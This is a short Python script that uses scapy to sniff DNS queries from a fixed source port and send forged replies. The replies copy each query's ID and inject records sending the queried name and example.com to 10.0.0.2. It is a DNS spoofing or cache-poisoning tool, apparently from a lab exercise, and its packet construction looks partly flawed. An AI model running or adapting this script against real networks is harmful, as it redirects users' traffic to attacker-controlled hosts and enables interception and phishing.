from scapy.all import *
from scapy.layers.dns import *


def dns_server(pkt):
    if DNSQR in pkt and pkt[UDP].sport == 1234:
        print(f"DNS Query from {pkt[IP].src} for {pkt[DNSQR].qname.decode()}")
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd)
        dns_resp = DNSRR(rrname=pkt[DNSQR].qname, rdata="10.0.0.2")
        dns_an = DNSRR(rrname="example.com", rdata="10.0.0.2")
        dns.nscount = 1
        dns.ns = dns_resp
        dns.arcount = 1
        dns.ar = dns_an
        response = ip / udp / dns
        send(response)
        print("[+]response dns packet sent")


if __name__ == '__main__':
    print("[+]listening for dns request packet")
    sniff(filter="udp and src port 1234", prn=dns_server)
